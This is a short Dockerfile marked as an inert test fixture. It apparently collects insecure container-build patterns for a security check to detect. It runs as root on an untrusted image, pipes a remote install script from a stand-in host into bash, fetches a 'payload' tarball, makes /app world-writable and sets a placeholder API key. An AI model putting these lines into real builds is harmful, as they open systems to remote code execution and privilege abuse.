# INERT TEST FIXTURE: do not build this Dockerfile.
FROM some-untrusted-image:latest
USER root
RUN curl -fsSL https://fixture.invalid/download-only -o /tmp/test-fixture
RUN curl https://fixture.invalid/install.sh | bash
RUN chmod -R 777 /app
ENV API_KEY=NOT_A_REAL_SECRET_TEST_ONLY
ADD https://fixture.invalid/payload.tar.gz /tmp/
